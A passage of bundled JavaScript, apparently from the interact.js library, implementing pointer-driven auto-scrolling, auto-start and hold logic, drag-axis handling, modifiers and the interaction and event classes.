                  O = { x: T.x - b.x, y: T.y - b.y };
                (O.x || O.y) &&
                  r.fire({
                    type: "autoscroll",
                    target: l,
                    interactable: r,
                    delta: O,
                    interaction: s,
                    container: h,
                  });
              }
              me.prevTime = g;
            }
            me.isScrolling && (_n.cancel(me.i), (me.i = _n.request(me.scroll)));
          },
          check: function (s, r) {
            var l;
            return null == (l = s.options[r].autoScroll) ? void 0 : l.enabled;
          },
          onInteractionMove: function (s) {
            var r = s.interaction,
              l = s.pointer;
            if (r.interacting() && me.check(r.interactable, r.prepared.name))
              if (r.simulation) me.x = me.y = 0;
              else {
                var c,
                  d,
                  h,
                  g,
                  m = r.interactable,
                  A = r.element,
                  P = r.prepared.name,
                  b = m.options[P].autoScroll,
                  T = El(b.container, m, A);
                if (M.window(T))
                  (g = l.clientX < me.margin),
                    (c = l.clientY < me.margin),
                    (d = l.clientX > T.innerWidth - me.margin),
                    (h = l.clientY > T.innerHeight - me.margin);
                else {
                  var O = Bo(T);
                  (g = l.clientX < O.left + me.margin),
                    (c = l.clientY < O.top + me.margin),
                    (d = l.clientX > O.right - me.margin),
                    (h = l.clientY > O.bottom - me.margin);
                }
                (me.x = d ? 1 : g ? -1 : 0),
                  (me.y = h ? 1 : c ? -1 : 0),
                  me.isScrolling ||
                    ((me.margin = b.margin), (me.speed = b.speed), me.start(r));
              }
          },
        };
      function El(s, r, l) {
        return (M.string(s) ? $t(s, r, l) : s) || C(l);
      }
      function Dl(s) {
        return (
          M.window(s) && (s = window.document.body),
          { x: s.scrollLeft, y: s.scrollTop }
        );
      }
      var xh = {
        id: "auto-scroll",
        install: function (s) {
          var r = s.defaults,
            l = s.actions;
          (s.autoScroll = me),
            (me.now = function () {
              return s.now();
            }),
            (l.phaselessTypes.autoscroll = !0),
            (r.perAction.autoScroll = me.defaults);
        },
        listeners: {
          "interactions:new": function (s) {
            s.interaction.autoScroll = null;
          },
          "interactions:destroy": function (s) {
            (s.interaction.autoScroll = null),
              me.stop(),
              me.interaction && (me.interaction = null);
          },
          "interactions:stop": me.stop,
          "interactions:action-move": function (s) {
            return me.onInteractionMove(s);
          },
        },
      };
      function Yo(s, r) {
        var l = !1;
        return function () {
          return l || (te.console.warn(r), (l = !0)), s.apply(this, arguments);
        };
      }
      function fs(s, r) {
        return (s.name = r.name), (s.axis = r.axis), (s.edges = r.edges), s;
      }
      function Ph(s) {
        return M.bool(s)
          ? ((this.options.styleCursor = s), this)
          : null === s
          ? (delete this.options.styleCursor, this)
          : this.options.styleCursor;
      }
      function Mh(s) {
        return M.func(s)
          ? ((this.options.actionChecker = s), this)
          : null === s
          ? (delete this.options.actionChecker, this)
          : this.options.actionChecker;
      }
      var Sh = {
        id: "auto-start/interactableMethods",
        install: function (s) {
          var r = s.Interactable;
          (r.prototype.getAction = function (l, c, d, h) {
            var m,
              A,
              P,
              b,
              T,
              O,
              N,
              g =
                ((A = c),
                (P = d),
                (b = h),
                (T = s),
                (O = (m = this).getRect(b)),
                (N = {
                  action: null,
                  interactable: m,
                  interaction: P,
                  element: b,
                  rect: O,
                  buttons: A.buttons || { 0: 1, 1: 4, 3: 8, 4: 16 }[A.button],
                }),
                T.fire("auto-start:check", N),
                N.action);
            return this.options.actionChecker
              ? this.options.actionChecker(l, c, g, this, h, d)
              : g;
          }),
            (r.prototype.ignoreFrom = Yo(function (l) {
              return this._backCompatOption("ignoreFrom", l);
            }, "Interactable.ignoreFrom() has been deprecated. Use Interactble.draggable({ignoreFrom: newValue}).")),
            (r.prototype.allowFrom = Yo(function (l) {
              return this._backCompatOption("allowFrom", l);
            }, "Interactable.allowFrom() has been deprecated. Use Interactble.draggable({allowFrom: newValue}).")),
            (r.prototype.actionChecker = Mh),
            (r.prototype.styleCursor = Ph);
        },
      };
      function Il(s, r, l, c, d) {
        return r.testIgnoreAllow(r.options[s.name], l, c) &&
          r.options[s.name].enabled &&
          Ti(r, l, s, d)
          ? s
          : null;
      }
      function Th(s, r, l, c, d, h, g) {
        for (var m = 0, A = c.length; m < A; m++) {
          var P = c[m],
            b = d[m],
            T = P.getAction(r, l, s, b);
          if (T) {
            var O = Il(T, P, b, h, g);
            if (O) return { action: O, interactable: P, element: b };
          }
        }
        return { action: null, interactable: null, element: null };
      }
      function Ol(s, r, l, c, d) {
        var h = [],
          g = [],
          m = c;
        function A(b) {
          h.push(b), g.push(m);
        }
        for (; M.element(m); ) {
          (h = []), (g = []), d.interactables.forEachMatch(m, A);
          var P = Th(s, r, l, h, g, c, d);
          if (P.action && !P.interactable.options[P.action.name].manualStart)
            return P;
          m = et(m);
        }
        return { action: null, interactable: null, element: null };
      }
      function Rl(s, r, l) {
        var c = r.action,
          d = r.interactable,
          h = r.element;
        (c = c || { name: null }),
          (s.interactable = d),
          (s.element = h),
          fs(s.prepared, c),
          (s.rect = d && c.name ? d.getRect(h) : null),
          Wl(s, l),
          l.fire("autoStart:prepared", { interaction: s });
      }
      function Ti(s, r, l, c) {
        var d = s.options,
          h = d[l.name].max,
          g = d[l.name].maxPerElement,
          m = c.autoStart.maxInteractions,
          A = 0,
          P = 0,
          b = 0;
        if (!(h && g && m)) return !1;
        for (var T = 0, O = c.interactions.list; T < O.length; T++) {
          var J = O[T],
            N = J.prepared.name;
          if (
            J.interacting() &&
            (++A >= m ||
              (J.interactable === s &&
                ((P += N === l.name ? 1 : 0) >= h ||
                  (J.element === r && (b++, N === l.name && b >= g)))))
          )
            return !1;
        }
        return m > 0;
      }
      function Cl(s, r) {
        return M.number(s)
          ? ((r.autoStart.maxInteractions = s), this)
          : r.autoStart.maxInteractions;
      }
      function hs(s, r, l) {
        var c = l.autoStart.cursorElement;
        c && c !== s && (c.style.cursor = ""),
          (s.ownerDocument.documentElement.style.cursor = r),
          (s.style.cursor = r),
          (l.autoStart.cursorElement = r ? s : null);
      }
      function Wl(s, r) {
        var l = s.interactable,
          c = s.element,
          d = s.prepared;
        if ("mouse" === s.pointerType && l && l.options.styleCursor) {
          var h = "";
          if (d.name) {
            var g = l.options[d.name].cursorChecker;
            h = M.func(g)
              ? g(d, l, c, s._interacting)
              : r.actions.map[d.name].getCursor(d);
          }
          hs(s.element, h || "", r);
        } else
          r.autoStart.cursorElement && hs(r.autoStart.cursorElement, "", r);
      }
      var ps = {
          id: "auto-start/base",
          before: ["actions"],
          install: function (s) {
            var r = s.interactStatic,
              l = s.defaults;
            s.usePlugin(Sh),
              (l.base.actionChecker = null),
              (l.base.styleCursor = !0),
              ae(l.perAction, {
                manualStart: !1,
                max: 1 / 0,
                maxPerElement: 1,
                allowFrom: null,
                ignoreFrom: null,
                mouseButtons: 1,
              }),
              (r.maxInteractions = function (c) {
                return Cl(c, s);
              }),
              (s.autoStart = {
                maxInteractions: 1 / 0,
                withinInteractionLimit: Ti,
                cursorElement: null,
              });
          },
          listeners: {
            "interactions:down": function (s, r) {
              var l = s.interaction,
                c = s.pointer,
                d = s.event,
                h = s.eventTarget;
              l.interacting() || Rl(l, Ol(l, c, d, h, r), r);
            },
            "interactions:move": function (s, r) {
              var l, c, d, h, g, m;
              (c = r),
                (d = (l = s).interaction),
                (h = l.pointer),
                (g = l.event),
                (m = l.eventTarget),
                "mouse" !== d.pointerType ||
                  d.pointerIsDown ||
                  d.interacting() ||
                  Rl(d, Ol(d, h, g, m, c), c),
                (function (l, c) {
                  var d = l.interaction;
                  if (
                    d.pointerIsDown &&
                    !d.interacting() &&
                    d.pointerWasMoved &&
                    d.prepared.name
                  ) {
                    c.fire("autoStart:before-start", l);
                    var h = d.interactable,
                      g = d.prepared.name;
                    g &&
                      h &&
                      (h.options[g].manualStart ||
                      !Ti(h, d.element, d.prepared, c)
                        ? d.stop()
                        : (d.start(d.prepared, h, d.element), Wl(d, c)));
                  }
                })(s, r);
            },
            "interactions:stop": function (s, r) {
              var l = s.interaction,
                c = l.interactable;
              c && c.options.styleCursor && hs(l.element, "", r);
            },
          },
          maxInteractions: Cl,
          withinInteractionLimit: Ti,
          validateAction: Il,
        },
        Eh = {
          id: "auto-start/dragAxis",
          listeners: {
            "autoStart:before-start": function (s, r) {
              var l = s.interaction,
                c = s.eventTarget,
                d = s.dx,
                h = s.dy;
              if ("drag" === l.prepared.name) {
                var g = Math.abs(d),
                  m = Math.abs(h),
                  A = l.interactable.options.drag,
                  P = A.startAxis,
                  b = g > m ? "x" : g < m ? "y" : "xy";
                if (
                  ((l.prepared.axis =
                    "start" === A.lockAxis ? b[0] : A.lockAxis),
                  "xy" !== b && "xy" !== P && P !== b)
                ) {
                  l.prepared.name = null;
                  for (
                    var T = c,
                      O = function (N) {
                        if (N !== l.interactable) {
                          var H = l.interactable.options.drag;
                          if (!H.manualStart && N.testIgnoreAllow(H, T, c)) {
                            var re = N.getAction(
                              l.downPointer,
                              l.downEvent,
                              l,
                              T
                            );
                            if (
                              re &&
                              "drag" === re.name &&
                              (function (ne, ce) {
                                if (!ce) return !1;
                                var be = ce.options.drag.startAxis;
                                return "xy" === ne || "xy" === be || be === ne;
                              })(b, N) &&
                              ps.validateAction(re, N, T, c, r)
                            )
                              return N;
                          }
                        }
                      };
                    M.element(T);

                  ) {
                    var J = r.interactables.forEachMatch(T, O);
                    if (J) {
                      (l.prepared.name = "drag"),
                        (l.interactable = J),
                        (l.element = T);
                      break;
                    }
                    T = et(T);
                  }
                }
              }
            },
          },
        };
      function gs(s) {
        var r = s.prepared && s.prepared.name;
        if (!r) return null;
        var l = s.interactable.options;
        return l[r].hold || l[r].delay;
      }
      var Ih = {
          id: "auto-start/hold",
          install: function (s) {
            var r = s.defaults;
            s.usePlugin(ps), (r.perAction.hold = 0), (r.perAction.delay = 0);
          },
          listeners: {
            "interactions:new": function (s) {
              s.interaction.autoStartHoldTimer = null;
            },
            "autoStart:prepared": function (s) {
              var r = s.interaction,
                l = gs(r);
              l > 0 &&
                (r.autoStartHoldTimer = setTimeout(function () {
                  r.start(r.prepared, r.interactable, r.element);
                }, l));
            },
            "interactions:move": function (s) {
              var r = s.interaction,
                l = s.duplicate;
              r.autoStartHoldTimer &&
                r.pointerWasMoved &&
                !l &&
                (clearTimeout(r.autoStartHoldTimer),
                (r.autoStartHoldTimer = null));
            },
            "autoStart:before-start": function (s) {
              var r = s.interaction;
              gs(r) > 0 && (r.prepared.name = null);
            },
          },
          getHoldDuration: gs,
        },
        Oh = {
          id: "auto-start",
          install: function (s) {
            s.usePlugin(ps), s.usePlugin(Ih), s.usePlugin(Eh);
          },
        },
        Rh = function (s) {
          return /^(always|never|auto)$/.test(s)
            ? ((this.options.preventDefault = s), this)
            : M.bool(s)
            ? ((this.options.preventDefault = s ? "always" : "never"), this)
            : this.options.preventDefault;
        };
      function Ch(s) {
        var r = s.interaction,
          l = s.event;
        r.interactable && r.interactable.checkAndPreventDefault(l);
      }
      var Gl = {
        id: "core/interactablePreventDefault",
        install: function (s) {
          var r = s.Interactable;
          (r.prototype.preventDefault = Rh),
            (r.prototype.checkAndPreventDefault = function (l) {
              return (function (c, d, h) {
                var g = c.options.preventDefault;
                if ("never" !== g)
                  if ("always" !== g) {
                    if (
                      d.events.supportsPassive &&
                      /^touch(start|move)$/.test(h.type)
                    ) {
                      var m = C(h.target).document,
                        A = d.getDocOptions(m);
                      if (!A || !A.events || !1 !== A.events.passive) return;
                    }
                    /^(mouse|pointer|touch)*(down|start)/i.test(h.type) ||
                      (M.element(h.target) &&
                        vt(
                          h.target,
                          "input,select,textarea,[contenteditable=true],[contenteditable=true] *"
                        )) ||
                      h.preventDefault();
                  } else h.preventDefault();
              })(this, s, l);
            }),
            s.interactions.docEvents.push({
              type: "dragstart",
              listener: function (l) {
                for (var c = 0, d = s.interactions.list; c < d.length; c++) {
                  var h = d[c];
                  if (
                    h.element &&
                    (h.element === l.target || we(h.element, l.target))
                  )
                    return void h.interactable.checkAndPreventDefault(l);
                }
              },
            });
        },
        listeners: ["down", "move", "up", "cancel"].reduce(function (s, r) {
          return (s["interactions:".concat(r)] = Ch), s;
        }, {}),
      };
      function ki(s, r) {
        if (r.phaselessTypes[s]) return !0;
        for (var l in r.map)
          if (0 === s.indexOf(l) && s.substr(l.length) in r.phases) return !0;
        return !1;
      }
      function go(s) {
        var r = {};
        for (var l in s) {
          var c = s[l];
          M.plainObject(c)
            ? (r[l] = go(c))
            : M.array(c)
            ? (r[l] = At(c))
            : (r[l] = c);
        }
        return r;
      }
      var ms = (function () {
        function s(r) {
          a(this, s),
            (this.states = []),
            (this.startOffset = { left: 0, right: 0, top: 0, bottom: 0 }),
            (this.startDelta = void 0),
            (this.result = void 0),
            (this.endResult = void 0),
            (this.startEdges = void 0),
            (this.edges = void 0),
            (this.interaction = void 0),
            (this.interaction = r),
            (this.result = Ei()),
            (this.edges = { left: !1, right: !1, top: !1, bottom: !1 });
        }
        return (
          f(s, [
            {
              key: "start",
              value: function (r, l) {
                var c,
                  d,
                  P,
                  b,
                  T,
                  h = r.phase,
                  g = this.interaction,
                  m =
                    ((b = (P = g).interactable.options[P.prepared.name]),
                    (T = b.modifiers) && T.length
                      ? T
                      : [
                          "snap",
                          "snapSize",
                          "snapEdges",
                          "restrict",
                          "restrictEdges",
                          "restrictSize",
                        ]
                          .map(function (O) {
                            var J = b[O];
                            return (
                              J &&
                              J.enabled && { options: J, methods: J._methods }
                            );
                          })
                          .filter(function (O) {
                            return !!O;
                          }));
                this.prepareStates(m),
                  (this.startEdges = ae({}, g.edges)),
                  (this.edges = ae({}, this.startEdges)),
                  (this.startOffset =
                    ((d = l),
                    (c = g.rect)
                      ? {
                          left: d.x - c.left,
                          top: d.y - c.top,
                          right: c.right - d.x,
                          bottom: c.bottom - d.y,
                        }
                      : { left: 0, top: 0, right: 0, bottom: 0 })),
                  (this.startDelta = { x: 0, y: 0 });
                var A = this.fillArg({ phase: h, pageCoords: l, preEnd: !1 });
                return (
                  (this.result = Ei()),
                  this.startAll(A),
                  (this.result = this.setAll(A))
                );
              },
            },
            {
              key: "fillArg",
              value: function (r) {
                var l = this.interaction;
                return (
                  (r.interaction = l),
                  (r.interactable = l.interactable),
                  (r.element = l.element),
                  r.rect || (r.rect = l.rect),
                  r.edges || (r.edges = this.startEdges),
                  (r.startOffset = this.startOffset),
                  r
                );
              },
            },
            {
              key: "startAll",
              value: function (r) {
                for (var l = 0, c = this.states; l < c.length; l++) {
                  var d = c[l];
                  d.methods.start && ((r.state = d), d.methods.start(r));
                }
              },
            },
            {
              key: "setAll",
              value: function (r) {
                var l = r.phase,
                  c = r.preEnd,
                  d = r.skipModifiers,
                  h = r.rect,
                  g = r.edges;
                (r.coords = ae({}, r.pageCoords)),
                  (r.rect = ae({}, h)),
                  (r.edges = ae({}, g));
                for (
                  var m = d ? this.states.slice(d) : this.states,
                    A = Ei(r.coords, r.rect),
                    P = 0;
                  P < m.length;
                  P++
                ) {
                  var b,
                    T = m[P],
                    O = T.options,
                    J = ae({}, r.coords),
                    N = null;
                  null != (b = T.methods) &&
                    b.set &&
                    this.shouldDo(O, c, l) &&
                    ((r.state = T),
                    (N = T.methods.set(r)),
                    S(r.edges, r.rect, {
                      x: r.coords.x - J.x,
                      y: r.coords.y - J.y,
                    })),
                    A.eventProps.push(N);
                }
                ae(this.edges, r.edges),
                  (A.delta.x = r.coords.x - r.pageCoords.x),
                  (A.delta.y = r.coords.y - r.pageCoords.y),
                  (A.rectDelta.left = r.rect.left - h.left),
                  (A.rectDelta.right = r.rect.right - h.right),
                  (A.rectDelta.top = r.rect.top - h.top),
                  (A.rectDelta.bottom = r.rect.bottom - h.bottom);
                var H = this.result.coords,
                  re = this.result.rect;
                if (H && re) {
                  var ne =
                    A.rect.left !== re.left ||
                    A.rect.right !== re.right ||
                    A.rect.top !== re.top ||
                    A.rect.bottom !== re.bottom;
                  A.changed = ne || H.x !== A.coords.x || H.y !== A.coords.y;
                }
                return A;
              },
            },
            {
              key: "applyToInteraction",
              value: function (r) {
                var l = this.interaction,
                  c = r.phase,
                  d = l.coords.cur,
                  h = l.coords.start,
                  g = this.result,
                  m = this.startDelta,
                  A = g.delta;
                "start" === c && ae(this.startDelta, g.delta);
                for (
                  var P = 0,
                    b = [
                      [h, m],
                      [d, A],
                    ];
                  P < b.length;
                  P++
                ) {
                  var T = b[P],
                    O = T[0],
                    J = T[1];
                  (O.page.x += J.x),
                    (O.page.y += J.y),
                    (O.client.x += J.x),
                    (O.client.y += J.y);
                }
                var N = this.result.rectDelta,
                  H = r.rect || l.rect;
                (H.left += N.left),
                  (H.right += N.right),
                  (H.top += N.top),
                  (H.bottom += N.bottom),
                  (H.width = H.right - H.left),
                  (H.height = H.bottom - H.top);
              },
            },
            {
              key: "setAndApply",
              value: function (r) {
                var l = this.interaction,
                  c = r.phase,
                  d = r.preEnd,
                  h = r.skipModifiers,
                  g = this.setAll(
                    this.fillArg({
                      preEnd: d,
                      phase: c,
                      pageCoords: r.modifiedCoords || l.coords.cur.page,
                    })
                  );
                if (
                  ((this.result = g),
                  !g.changed &&
                    (!h || h < this.states.length) &&
                    l.interacting())
                )
                  return !1;
                if (r.modifiedCoords) {
                  var m = l.coords.cur.page,
                    A = {
                      x: r.modifiedCoords.x - m.x,
                      y: r.modifiedCoords.y - m.y,
                    };
                  (g.coords.x += A.x),
                    (g.coords.y += A.y),
                    (g.delta.x += A.x),
                    (g.delta.y += A.y);
                }
                this.applyToInteraction(r);
              },
            },
            {
              key: "beforeEnd",
              value: function (r) {
                var l = r.interaction,
                  c = r.event,
                  d = this.states;
                if (d && d.length) {
                  for (var h = !1, g = 0; g < d.length; g++) {
                    var m = d[g];
                    r.state = m;
                    var A = m.options,
                      P = m.methods,
                      b = P.beforeEnd && P.beforeEnd(r);
                    if (b) return (this.endResult = b), !1;
                    h = h || (!h && this.shouldDo(A, !0, r.phase, !0));
                  }
                  h && l.move({ event: c, preEnd: !0 });
                }
              },
            },
            {
              key: "stop",
              value: function (r) {
                var l = r.interaction;
                if (this.states && this.states.length) {
                  var c = ae(
                    {
                      states: this.states,
                      interactable: l.interactable,
                      element: l.element,
                      rect: null,
                    },
                    r
                  );
                  this.fillArg(c);
                  for (var d = 0, h = this.states; d < h.length; d++) {
                    var g = h[d];
                    (c.state = g), g.methods.stop && g.methods.stop(c);
                  }
                  (this.states = null), (this.endResult = null);
                }
              },
            },
            {
              key: "prepareStates",
              value: function (r) {
                this.states = [];
                for (var l = 0; l < r.length; l++) {
                  var c = r[l],
                    d = c.options,
                    h = c.methods,
                    g = c.name;
                  this.states.push({
                    options: d,
                    methods: h,
                    index: l,
                    name: g,
                  });
                }
                return this.states;
              },
            },
            {
              key: "restoreInteractionCoords",
              value: function (r) {
                var l = r.interaction,
                  c = l.coords,
                  d = l.rect,
                  h = l.modification;
                if (h.result) {
                  for (
                    var g = h.startDelta,
                      m = h.result,
                      A = m.delta,
                      P = m.rectDelta,
                      b = 0,
                      T = [
                        [c.start, g],
                        [c.cur, A],
                      ];
                    b < T.length;
                    b++
                  ) {
                    var O = T[b],
                      J = O[0],
                      N = O[1];
                    (J.page.x -= N.x),
                      (J.page.y -= N.y),
                      (J.client.x -= N.x),
                      (J.client.y -= N.y);
                  }
                  (d.left -= P.left),
                    (d.right -= P.right),
                    (d.top -= P.top),
                    (d.bottom -= P.bottom);
                }
              },
            },
            {
              key: "shouldDo",
              value: function (r, l, c, d) {
                return !(
                  !r ||
                  !1 === r.enabled ||
                  (d && !r.endOnly) ||
                  (r.endOnly && !l) ||
                  ("start" === c && !r.setStart)
                );
              },
            },
            {
              key: "copyFrom",
              value: function (r) {
                (this.startOffset = r.startOffset),
                  (this.startDelta = r.startDelta),
                  (this.startEdges = r.startEdges),
                  (this.edges = r.edges),
                  (this.states = r.states.map(function (l) {
                    return go(l);
                  })),
                  (this.result = Ei(
                    ae({}, r.result.coords),
                    ae({}, r.result.rect)
                  ));
              },
            },
            {
              key: "destroy",
              value: function () {
                for (var r in this) this[r] = null;
              },
            },
          ]),
          s
        );
      })();
      function Ei(s, r) {
        return {
          rect: r,
          coords: s,
          delta: { x: 0, y: 0 },
          rectDelta: { left: 0, right: 0, top: 0, bottom: 0 },
          eventProps: [],
          changed: !0,
        };
      }
      function xn(s, r) {
        var l = s.defaults,
          c = {
            start: s.start,
            set: s.set,
            beforeEnd: s.beforeEnd,
            stop: s.stop,
          },
          d = function (h) {
            var g = h || {};
            for (var m in ((g.enabled = !1 !== g.enabled), l))
              m in g || (g[m] = l[m]);
            var A = {
              options: g,
              methods: c,
              name: r,
              enable: function () {
                return (g.enabled = !0), A;
              },
              disable: function () {
                return (g.enabled = !1), A;
              },
            };
            return A;
          };
        return (
          r && "string" == typeof r && ((d._defaults = l), (d._methods = c)), d
        );
      }
      function Uo(s) {
        var r = s.iEvent,
          l = s.interaction.modification.result;
        l && (r.modifiers = l.eventProps);
      }
      var Fl = {
          id: "modifiers/base",
          before: ["actions"],
          install: function (s) {
            s.defaults.perAction.modifiers = [];
          },
          listeners: {
            "interactions:new": function (s) {
              var r = s.interaction;
              r.modification = new ms(r);
            },
            "interactions:before-action-start": function (s) {
              var r = s.interaction,
                l = s.interaction.modification;
              l.start(s, r.coords.start.page),
                (r.edges = l.edges),
                l.applyToInteraction(s);
            },
            "interactions:before-action-move": function (s) {
              var r = s.interaction,
                l = r.modification,
                c = l.setAndApply(s);
              return (r.edges = l.edges), c;
            },
            "interactions:before-action-end": function (s) {
              var r = s.interaction,
                l = r.modification,
                c = l.beforeEnd(s);
              return (r.edges = l.startEdges), c;
            },
            "interactions:action-start": Uo,
            "interactions:action-move": Uo,
            "interactions:action-end": Uo,
            "interactions:after-action-start": function (s) {
              return s.interaction.modification.restoreInteractionCoords(s);
            },
            "interactions:after-action-move": function (s) {
              return s.interaction.modification.restoreInteractionCoords(s);
            },
            "interactions:stop": function (s) {
              return s.interaction.modification.stop(s);
            },
          },
        },
        Ll = {
          base: { preventDefault: "auto", deltaSource: "page" },
          perAction: { enabled: !1, origin: { x: 0, y: 0 } },
          actions: {},
        },
        vs = (function (s) {
          v(l, s);
          var r = k(l);
          function l(c, d, h, g, m, A, P) {
            var b;
            a(this, l),
              ((b = r.call(this, c)).relatedTarget = null),
              (b.screenX = void 0),
              (b.screenY = void 0),
              (b.button = void 0),
              (b.buttons = void 0),
              (b.ctrlKey = void 0),
              (b.shiftKey = void 0),
              (b.altKey = void 0),
              (b.metaKey = void 0),
              (b.page = void 0),
              (b.client = void 0),
              (b.delta = void 0),
              (b.rect = void 0),
              (b.x0 = void 0),
              (b.y0 = void 0),
              (b.t0 = void 0),
              (b.dt = void 0),
              (b.duration = void 0),
              (b.clientX0 = void 0),
              (b.clientY0 = void 0),
              (b.velocity = void 0),
              (b.speed = void 0),
              (b.swipe = void 0),
              (b.axes = void 0),
              (b.preEnd = void 0),
              (m = m || c.element);
            var T = c.interactable,
              O = ((T && T.options) || Ll).deltaSource,
              J = R(T, m, h),
              N = "start" === g,
              H = "end" === g,
              re = N ? x(b) : c.prevEvent,
              ne = N
                ? c.coords.start
                : H
                ? {
                    page: re.page,
                    client: re.client,
                    timeStamp: c.coords.cur.timeStamp,
                  }
                : c.coords.cur;
            return (
              (b.page = ae({}, ne.page)),
              (b.client = ae({}, ne.client)),
              (b.rect = ae({}, c.rect)),
              (b.timeStamp = ne.timeStamp),
              H ||
                ((b.page.x -= J.x),
                (b.page.y -= J.y),
                (b.client.x -= J.x),
                (b.client.y -= J.y)),
              (b.ctrlKey = d.ctrlKey),
              (b.altKey = d.altKey),
              (b.shiftKey = d.shiftKey),
              (b.metaKey = d.metaKey),
              (b.button = d.button),
              (b.buttons = d.buttons),
              (b.target = m),
              (b.currentTarget = m),
              (b.preEnd = A),
              (b.type = P || h + (g || "")),
              (b.interactable = T),
              (b.t0 = N ? c.pointers[c.pointers.length - 1].downTime : re.t0),
              (b.x0 = c.coords.start.page.x - J.x),
              (b.y0 = c.coords.start.page.y - J.y),
              (b.clientX0 = c.coords.start.client.x - J.x),
              (b.clientY0 = c.coords.start.client.y - J.y),
              (b.delta =
                N || H
                  ? { x: 0, y: 0 }
                  : { x: b[O].x - re[O].x, y: b[O].y - re[O].y }),
              (b.dt = c.coords.delta.timeStamp),
              (b.duration = b.timeStamp - b.t0),
              (b.velocity = ae({}, c.coords.velocity[O])),
              (b.speed = Q(b.velocity.x, b.velocity.y)),
              (b.swipe = H || "inertiastart" === g ? b.getSwipe() : null),
              b
            );
          }
          return (
            f(l, [
              {
                key: "getSwipe",
                value: function () {
                  var c = this._interaction;
                  if (
                    c.prevEvent.speed < 600 ||
                    this.timeStamp - c.prevEvent.timeStamp > 150
                  )
                    return null;
                  var d =
                    (180 *
                      Math.atan2(
                        c.prevEvent.velocityY,
                        c.prevEvent.velocityX
                      )) /
                    Math.PI;
                  d < 0 && (d += 360);
                  var h = 112.5 <= d && d < 247.5,
                    g = 202.5 <= d && d < 337.5;
                  return {
                    up: g,
                    down: !g && 22.5 <= d && d < 157.5,
                    left: h,
                    right: !h && (292.5 <= d || d < 67.5),
                    angle: d,
                    speed: c.prevEvent.speed,
                    velocity: {
                      x: c.prevEvent.velocityX,
                      y: c.prevEvent.velocityY,
                    },
                  };
                },
              },
              { key: "preventDefault", value: function () {} },
              {
                key: "stopImmediatePropagation",
                value: function () {
                  this.immediatePropagationStopped = this.propagationStopped =
                    !0;
                },
              },
              {
                key: "stopPropagation",
                value: function () {
                  this.propagationStopped = !0;
                },
              },
            ]),
            l
          );
        })(Hn);
      Object.defineProperties(vs.prototype, {
        pageX: {
          get: function () {
            return this.page.x;
          },
          set: function (s) {
            this.page.x = s;
          },
        },
        pageY: {
          get: function () {
            return this.page.y;
          },
          set: function (s) {
            this.page.y = s;
          },
        },
        clientX: {
          get: function () {
            return this.client.x;
          },
          set: function (s) {
            this.client.x = s;
          },
        },
        clientY: {
          get: function () {
            return this.client.y;
          },
          set: function (s) {
            this.client.y = s;
          },
        },
        dx: {
          get: function () {
            return this.delta.x;
          },
          set: function (s) {
            this.delta.x = s;
          },
        },
        dy: {
          get: function () {
            return this.delta.y;
          },
          set: function (s) {
            this.delta.y = s;
          },
        },
        velocityX: {
          get: function () {
            return this.velocity.x;
          },
          set: function (s) {
            this.velocity.x = s;
          },
        },
        velocityY: {
          get: function () {
            return this.velocity.y;
          },
          set: function (s) {
            this.velocity.y = s;
          },
        },
      });
      var s,
        Gh = f(function s(r, l, c, d, h) {
          a(this, s),
            (this.id = void 0),
            (this.pointer = void 0),
            (this.event = void 0),
            (this.downTime = void 0),
            (this.downTarget = void 0),
            (this.id = r),
            (this.pointer = l),
            (this.event = c),
            (this.downTime = d),
            (this.downTarget = h);
        }),
        Fh =
          (((s = {}).interactable = ""),
          (s.element = ""),
          (s.prepared = ""),
          (s.pointerIsDown = ""),
          (s.pointerWasMoved = ""),
          (s._proxy = ""),
          s),
        jl = (function (s) {
          return (
            (s.start = ""),
            (s.move = ""),
            (s.end = ""),
            (s.stop = ""),
            (s.interacting = ""),
            s
          );
        })({}),
        Lh = 0,
        jh = (function () {
          function s(r) {
            var l = this,
              c = r.pointerType,
              d = r.scopeFire;
            a(this, s),
              (this.interactable = null),
              (this.element = null),
              (this.rect = null),
              (this._rects = void 0),
              (this.edges = null),
              (this._scopeFire = void 0),
              (this.prepared = { name: null, axis: null, edges: null }),
              (this.pointerType = void 0),
              (this.pointers = []),
              (this.downEvent = null),
              (this.downPointer = {}),
              (this._latestPointer = {
                pointer: null,
                event: null,
                eventTarget: null,
              }),
              (this.prevEvent = null),
              (this.pointerIsDown = !1),
              (this.pointerWasMoved = !1),
              (this._interacting = !1),
              (this._ending = !1),
              (this._stopped = !0),
              (this._proxy = void 0),
              (this.simulation = null),
              (this.doMove = Yo(function (b) {
                this.move(b);
              }, "The interaction.doMove() method has been renamed to interaction.move()")),
              (this.coords = {
                start: {
                  page: { x: 0, y: 0 },
                  client: { x: 0, y: 0 },
                  timeStamp: 0,
                },
                prev: {
                  page: { x: 0, y: 0 },
                  client: { x: 0, y: 0 },
                  timeStamp: 0,
                },
                cur: {
                  page: { x: 0, y: 0 },
                  client: { x: 0, y: 0 },
                  timeStamp: 0,
                },
                delta: {
                  page: { x: 0, y: 0 },
                  client: { x: 0, y: 0 },
                  timeStamp: 0,
                },
                velocity: {
                  page: { x: 0, y: 0 },
                  client: { x: 0, y: 0 },
                  timeStamp: 0,
                },
              }),
              (this._id = Lh++),
              (this._scopeFire = d),
              (this.pointerType = c);
            var h = this;
            this._proxy = {};
            var g = function (b) {
              Object.defineProperty(l._proxy, b, {
                get: function () {
                  return h[b];
                },
              });
            };
            for (var m in Fh) g(m);
            var A = function (b) {
              Object.defineProperty(l._proxy, b, {
                value: function () {
                  return h[b].apply(h, arguments);
                },
              });
            };
            for (var P in jl) A(P);
            this._scopeFire("interactions:new", { interaction: this });
          }
          return (
            f(s, [
              {
                key: "pointerMoveTolerance",
                get: function () {
                  return 1;
                },
              },
              {
                key: "pointerDown",
                value: function (r, l, c) {
                  var d = this.updatePointer(r, l, c, !0),
                    h = this.pointers[d];
                  this._scopeFire("interactions:down", {
                    pointer: r,
                    event: l,
                    eventTarget: c,
                    pointerIndex: d,
                    pointerInfo: h,
                    type: "down",
                    interaction: this,
                  });
                },
              },
              {
                key: "start",
                value: function (r, l, c) {
                  return (
                    !(
                      this.interacting() ||
                      !this.pointerIsDown ||
                      this.pointers.length < ("gesture" === r.name ? 2 : 1) ||
                      !l.options[r.name].enabled
                    ) &&
                    (fs(this.prepared, r),
                    (this.interactable = l),
                    (this.element = c),
                    (this.rect = l.getRect(c)),
                    (this.edges = this.prepared.edges
                      ? ae({}, this.prepared.edges)
                      : { left: !0, right: !0, top: !0, bottom: !0 }),
                    (this._stopped = !1),
                    (this._interacting =
                      this._doPhase({
                        interaction: this,
                        event: this.downEvent,
                        phase: "start",
